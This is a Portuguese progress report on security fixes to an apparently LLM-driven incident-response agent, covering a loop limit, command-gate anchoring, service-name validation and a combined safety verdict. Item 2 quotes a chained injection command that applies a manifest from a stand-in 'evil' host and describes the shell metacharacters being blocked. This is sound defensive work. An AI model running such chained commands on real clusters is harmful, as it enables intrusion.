# Progresso das correções P1

Origem: §5 "P1 — antes de qualquer uso fora do laboratório" de
[`analise-20261109.md`](analise-20261109.md). Os itens seguem a ordem de
gravidade. Cada item tem testes próprios e um commit local; nada foi enviado
para o remoto (sem push e sem PR).

**Como "verde" é medido:** os comandos `pytest` dos três jobs do CI
(`.github/workflows/ci.yml`), cada um no ambiente equivalente e com o status de
saída real:

- **unit:** `pytest tests/ -m unit --ignore=tests/rust`, só com as dependências
  mínimas do job;
- **integration:** `pytest tests/ -m "integration or snapshot"`, com o
  `requirements.txt` completo;
- **rust-build:** `pytest tests/`, com a extensão Rust compilada e instalada.

O CI não tem lint nem formatação, então não há outro comando a rodar.

| # | Item | IDs | Estado | Commit |
|---|---|---|---|---|
| 1 | Laço do orchestrator com saída e chamadas ao LLM limitadas; timeout no cliente | F01 | feito | ver `git log` |
| 2 | Gate de comando: metacaracteres de shell, âncora, nome de serviço | F02, T04, SEC-05, SEC-06 | feito | ver `git log` |
| 3 | CLI usa o veredito agregado de todas as camadas | F03 | feito | ver `git log` |
| 4 | Template de CPU no mitigator | NOVO-01 | pendente | — |
| 5 | Safety ligada no pipeline V1 (`proposed_action`) | ARQ-01, F04, SEC-04 | pendente | — |
| 6 | OAuth: autenticação do cliente em `/auth/token/register` | SEC-01, SEC-11 | pendente | — |
| 7 | Falhas silenciosas: log em vez de `except: pass`; `confidence` tipada; chamada morta a `step_predict` | F07, F5-02, ARQ-05, F5-01 | pendente | — |

## Item 1 — F01: laço do AgentOrchestrator

**Defeito.** O `while` de `AgentOrchestrator.run` só saía por `finalize` ou por
estourar o número de replans. Se toda reflexão devolvia `"continue"`, o mesmo
plano rodava de novo para sempre. Isso acontecia em qualquer falha do LLM,
porque o fallback de `_reflect_on_step` é `"continue"`. No relatório, foram
3,46 milhões de chamadas em 5 s.

**Correção:**

- `agents/orchestrator.py`:
  - **Plano esgotado:** um `for … else: break` faz o plano esgotado sem
    `finalize`/`replan` sair do laço e sintetizar o diagnóstico com o que foi
    coletado.
  - **Tamanho do plano:** `MAX_STEPS_PER_PLAN = 8` limita os planos e replans
    vindos do LLM. O total de reflexões por run fica em no máximo
    `(MAX_REPLANS + 1) × 8`.
  - **Síntese:** uma síntese que não é `dict` ou não traz `root_cause` (`{}`,
    lista, `null`) cai no diagnóstico heurístico. Antes, `{}` também mantinha o
    laço girando.
- `adapters/llm/anthropic_client.py`: a factory passa `timeout=60.0` e
  `max_retries=2` explícitos. Todos os pontos de produção criam o cliente por
  ela.

**Testes:** `tests/test_orchestrator_termination.py`, 10 testes marcados `unit`.

- **Como detecta o laço:** o cliente falso tem orçamento de 50 chamadas e, ao
  estourá-lo, levanta uma `BaseException`, que escapa dos `except Exception`.
  Um laço sem saída vira falha imediata em vez de pendurar a suíte.
- **Antes da correção:** 9 testes falharam pelo defeito. Os três de laço
  falharam por estourar o orçamento. O teste de replan falhou por um erro no
  próprio teste, corrigido depois, e não foi reverificado contra o código
  antigo.
- **Cenários cobertos:**
  - LLM sempre falhando;
  - LLM sempre respondendo `continue`;
  - JSON dentro de cercas `` ```json ``;
  - plano e replan com 1000 steps;
  - síntese sem `root_cause`;
  - timeout explícito na factory.

**CI local:** unit 690 passaram, integration 138 passaram, suíte completa 1381
passaram e 10 foram pulados. Status 0 nos três.

**Fica para o Allan:** o valor de 60 s de timeout é um palpite razoável, não
uma medição. Vale ajustá-lo com a latência real do modelo em uso.

## Item 2 — F02/T04/SEC-05/SEC-06: gate de comando e nome de serviço

**Defeito.** A allow-list do `PreExecutionValidator` usava `re.search`, sem
âncora. Um prefixo read-only aprovava qualquer coisa encadeada depois dele:
`kubectl get pods; kubectl apply -f http://evil/x.yaml` saía
`AUTO_APPROVED`. Além disso, o nome de serviço vindo da telemetria ou do LLM
era interpolado cru em `kubectl rollout undo deployment/{service}`.

**Correção:**

- `safety/pre_validator.py`:
  - **Metacaracteres:** `SHELL_METACHARACTERS` (`; & | < >`, `\n`, `\r`)
    bloqueia o comando antes de qualquer allow-list, com status `BLOCKED`.
  - **Âncora:** os padrões de leitura e de rollout passam a usar `re.match`,
    que casa só no início do comando.
  - Os padrões de alto risco continuam com `re.search`, porque ali casar em
    qualquer posição é o comportamento mais conservador.
- `agents/mitigator.py`:
  - `is_valid_service_name` exige um nome DNS-1123 *subdomain* com até 253
    caracteres.
  - **Nome inválido:** a ação sai sem comando, com risco `HIGH` e padrão
    `invalid_service`. Sem comando, o gate não aprova e a decisão vai para um
    humano.
  - Todos os nomes de serviço usados em `data/` e nos snapshots já estão
    nesse formato, e nenhum snapshot mudou.

**Testes:** `tests/test_command_gate.py`, 33 testes marcados `unit`.

- **Antes da correção:** 21 falharam. Os 12 que passavam eram os de
  comportamento legítimo, que precisam continuar passando.
- **Cenários cobertos:**
  - 10 formas de encadeamento e redirecionamento;
  - padrão permitido no meio do comando;
  - 8 comandos legítimos que continuam seguros;
  - 7 nomes de serviço inválidos e 4 válidos;
  - o caminho de ponta a ponta: serviço injetado → mitigator → gate.

**CI local:** unit 723 passaram, integration 138 passaram, suíte completa 1414
passaram e 10 foram pulados. Status 0 nos três.

**Efeito colateral aceito:** via MCP `validate_action`, qualquer comando com
`>` ou `<` passa a ser bloqueado, por exemplo `pip install 'x>=1.0'`. É
falhar fechado de propósito. Se o MCP precisar validar comandos com
especificador de versão, isso pede uma regra própria, não uma brecha na
allow-list.

## Item 3 — F03: a CLI decide com todas as camadas

**Defeito.** O exit code, o `requires_human` do evento Slack e o status
"AWAITING HUMAN" olhavam só a camada `pre_validator`. O veredito do
VersionValidator, produzido por `step_remediation_validation`, aparecia no
resumo e era descartado na decisão.

Caso real, rodado com as classes de verdade:
`kubectl rollout restart deployment/postgres:9.4` sai `AUTO_APPROVED` no
pre-validator e `MALICIOUS` no VersionValidator. Antes da correção, a CLI
devolvia exit 0.

**Correção** (`main.py`):

- `_requires_human(safety_result, remediation_result)` exige humano se
  qualquer camada bloquear.
- `_record_safety_decision` grava `stages.safety_decision` com
  `requires_human` e `blocked_by`.
- O veredito combinado passa a decidir:
  - o exit code 3;
  - o `requires_human` do Slack;
  - o "AWAITING HUMAN" do resumo;
  - o "Requires Human" do postmortem.

**Testes:** `tests/test_cli_safety_decision.py`, 9 testes marcados `unit`.

- **Antes da correção:** 8 falharam. O teste de exit code confirmou o
  defeito: `main()` devolvia 0 com o VersionValidator bloqueando.
- **Cenários cobertos:**
  - as 6 combinações de camadas;
  - as duas etapas reais com o comando acima, sem dublês nas camadas;
  - o `main()` devolvendo 3 quando só o VersionValidator bloqueia, e 0 quando
    todas aprovam.

**CI local:** unit 732 passaram, integration 138 passaram, suíte completa 1423
passaram e 10 foram pulados. Status 0 nos três.

**Observação, fora do P1:** `kubectl set image deployment/api
api=nginx:1.16.1` passa como `SAFE` no VersionValidator. É o achado F08 do
relatório (comparação exata de versão), que é P2.
